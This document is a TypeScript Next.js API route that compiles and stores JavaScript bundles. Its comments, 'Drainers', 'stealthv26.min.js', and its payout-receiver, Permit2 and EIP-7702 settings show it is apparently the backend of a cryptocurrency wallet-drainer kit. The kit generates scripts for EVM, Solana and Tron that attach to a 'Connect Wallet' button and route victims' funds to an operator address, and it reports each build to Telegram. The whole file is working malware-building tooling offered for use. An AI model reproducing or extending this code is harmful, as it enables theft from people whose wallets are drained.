import { NextResponse } from "next/server";
import { requireAuth } from "@/lib/api-auth";
import { sendTelegramNotification } from "@/lib/telegram";
import { enqueueCompileJob } from "@/lib/queues/compile";
import { isQueueEnabled } from "@/lib/queues";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { readCompileConfig, writeCompileConfig, type CompileConfig } from "@/lib/compile-config-store";
import { readOperationalConfig, writeOperationalConfig } from "@/lib/operational-config-store";
import { listScriptBuilds, saveScriptBuild } from "@/lib/script-build-store";
import { generateSolanaBundle, generateTronBundle } from "@/lib/runtime-bundles";
import {
  defaultAdvancedConfig,
  defaultAppKitConfig,
  defaultContractsConfig,
  defaultGeneralConfig,
  defaultModalConfig,
  defaultTokensConfig,
  defaultWalletConfig,
  defaultPayoutConfig,
  defaultStrategyConfig,
} from "@/lib/mock-data";
import { generateUniversalBundle } from "@/lib/universal-sdk-generator";
import { getContractById } from "@/lib/contract-registry";
import { buildBindingForContract } from "@/lib/standard-function-bindings";

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

async function mergeCompileConfig(body: Record<string, unknown>): Promise<CompileConfig> {
  const operational = await readOperationalConfig();
  return {
    general: { ...defaultGeneralConfig, ...((isRecord(body.general) ? body.general : {}) as Partial<CompileConfig["general"]>) },
    wallet: { ...defaultWalletConfig, ...((isRecord(body.wallet) ? body.wallet : {}) as Partial<CompileConfig["wallet"]>) },
    modal: { ...defaultModalConfig, ...((isRecord(body.modal) ? body.modal : {}) as Partial<CompileConfig["modal"]>) },
    tokens: { ...defaultTokensConfig, ...((isRecord(body.tokens) ? body.tokens : {}) as Partial<CompileConfig["tokens"]>) },
    advanced: { ...defaultAdvancedConfig, ...((isRecord(body.advanced) ? body.advanced : {}) as Partial<CompileConfig["advanced"]>) },
    payout: {
      ...defaultPayoutConfig,
      ...operational.payout,
      ...((isRecord(body.payout) ? body.payout : {}) as Partial<CompileConfig["payout"]>),
    },
    contracts: { ...defaultContractsConfig, ...operational.contracts, ...((isRecord(body.contracts) ? body.contracts : {}) as Partial<CompileConfig["contracts"]>) },
    strategy: { ...defaultStrategyConfig, ...operational.strategy, ...((isRecord(body.strategy) ? body.strategy : {}) as Partial<CompileConfig["strategy"]>) },
    appKit: { ...defaultAppKitConfig, ...operational.appKit, ...((isRecord(body.appKit) ? body.appKit : {}) as Partial<CompileConfig["appKit"]>) },
  };
}

export async function GET() {
  const guard = await requireAuth("sdk:download");
  if (guard) return guard;

  const config = await readCompileConfig();
  const builds = await listScriptBuilds();
  return NextResponse.json({
    status: "ok",
    config,
    latestBuild: builds[0] ?? null,
    builds,
  });
}

export async function POST(request: Request) {
  const guard = await requireAuth("sdk:compile");
  if (guard) return guard;

  try {
    const body = await request.json();
    const payload = isRecord(body) ? body : {};
    const { receiverAddress, saveConfig = true, saveBuild = true } = payload;
    const source = typeof payload.source === "string" ? payload.source : "compile";

    // ── Queue mode ────────────────────────────────────────────────────────
    const useQueue = isQueueEnabled() && (payload.queue === true || payload.async === true);
    if (useQueue) {
      const job = await enqueueCompileJob({
        projectId: "platform",
        source: source === "frontpage" ? "dashboard" : "api",
        chatId: typeof payload.chatId === "string" ? payload.chatId : undefined,
        includeButton: typeof payload.chatId === "string",
        lightResult: false,
      });
      return NextResponse.json({
        status: "ok",
        queued: true,
        jobId: job?.id ?? null,
        statusUrl: job?.id ? `/api/compile/status/${job.id}` : null,
        message: "Compile job queued",
      });
    }

    const timestamp = new Date().toISOString();
    const version = "26.0.0";

    const operational = await readOperationalConfig();
    const merged = await mergeCompileConfig(payload);

    if (saveConfig) {
      await writeCompileConfig(merged);
      const updatedOperational = await readOperationalConfig();
      updatedOperational.payout = merged.payout;
      await writeOperationalConfig(updatedOperational);
    }

    const compiledConfig = {
      version,
      timestamp,
      general: merged.general,
      wallet: merged.wallet,
      modal: merged.modal,
      tokens: merged.tokens,
      advanced: merged.advanced,
      payout: merged.payout,
      contracts: merged.contracts,
      strategy: merged.strategy,
      appKit: merged.appKit,
    };

    const resolvedReceiver =
      (typeof receiverAddress === "string" && receiverAddress) ||
      operational.payout?.address ||
      merged.payout.address ||
      "0x0000000000000000000000000000000000000000";

    // === UNIVERSAL GENERATOR (Sequence + Forge Drainers) ===
    const selectedContractId = (payload.contractId as string) || "stage1-module";
    const contractMeta = getContractById(selectedContractId);
    const selectedBinding = contractMeta ? buildBindingForContract(contractMeta) : null;
    if (selectedBinding && contractMeta) {
      merged.contracts = {
        ...merged.contracts,
        primary: {
          name: contractMeta.name,
          address: contractMeta.address || "",
          abiName: contractMeta.name,
          abi: [...(contractMeta.abi || ([] as unknown[]))],
          chainId: merged.contracts?.primary?.chainId ?? 1,
          selectedFunctions: [...(contractMeta.functions || [])],
        },
        functionBindings: [
          selectedBinding,
          ...(merged.contracts?.functionBindings || []).filter((b) => b.preset !== selectedBinding.preset),
        ],
      };
      merged.general = { ...merged.general, transactionFunctionName: selectedBinding.preset };
      if (!isRecord(payload.strategy)) {
        merged.strategy = { ...merged.strategy, mode: "direct", permit2Enabled: false, gaslessEnabled: false, multicallEnabled: false, delegateCallEnabled: false, eip7702Enabled: false };
      }
    }

    let sdkBundle: string;

    if (contractMeta) {
      const result = await generateUniversalBundle({
        contract: contractMeta,
        receiverAddress: resolvedReceiver,
        buttonSelector: merged.general.connectButtonClass || ".connect-btn",
        buttonText: merged.general.connectText || "Connect Wallet",
        twoStep: merged.advanced?.twoStepWithdrawal === "true",
        ecosystem: merged.general.ecosystem || "evm",
        config: merged,
        source,
      });
      sdkBundle = result.bundle;
    } else {
      // Fallback (old behaviour)
      sdkBundle =
        merged.general.ecosystem === "solana"
          ? generateSolanaBundle({
              general: merged.general,
              wallet: merged.wallet,
              modal: merged.modal,
              tokens: merged.tokens,
              advanced: merged.advanced,
              receiverAddress: resolvedReceiver,
            })
          : merged.general.ecosystem === "tron"
            ? generateTronBundle({
                general: merged.general,
                wallet: merged.wallet,
                modal: merged.modal,
                tokens: merged.tokens,
                advanced: merged.advanced,
                receiverAddress: resolvedReceiver,
              })
            : generateSDKBundle({
                general: merged.general,
                wallet: merged.wallet,
                modal: { ...merged.modal, exposeExternalSDK: true },
                tokens: merged.tokens,
                advanced: merged.advanced,
                contracts: merged.contracts,
                strategy: merged.strategy,
                appKit: merged.appKit,
                receiverAddress: resolvedReceiver,
              });
    }

    const build = saveBuild
      ? await saveScriptBuild({
          bundle: sdkBundle,
          framework: merged.modal.modalFrameworkStyle,
          source: source === "frontpage" ? "frontpage" : "compile",
        })
      : null;

    void sendTelegramNotification({
      message: [
        "🛠 <b>St3 Compile</b>",
        `strategy: <b>${merged.strategy.mode}</b> · backend: <b>${merged.strategy.executionBackend}</b>`,
        `ecosystem: ${merged.general.ecosystem} · wallet: ${merged.modal.modalFrameworkStyle}`,
        `bundle: ${(sdkBundle.length / 1024).toFixed(2)} KB`,
        `build: ${build?.filename ?? "(not saved)"}`,
        `receiver: <code>${resolvedReceiver}</code>`,
      ].join("\n"),
    });

    return NextResponse.json({
      status: "ok",
      message: "SDK compiled successfully",
      timestamp,
      version,
      bundle: {
        content: sdkBundle,
        size: sdkBundle.length,
        sizeKB: (sdkBundle.length / 1024).toFixed(2),
        filename: "stealthv26.min.js",
      },
      publishedBuild: build,
      config: compiledConfig,
    });
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : "Compilation failed";
    console.error("[compile/POST] Error:", errorMessage, error);
    return NextResponse.json(
      { status: "error", message: errorMessage },
      { status: 500 }
    );
  }
}
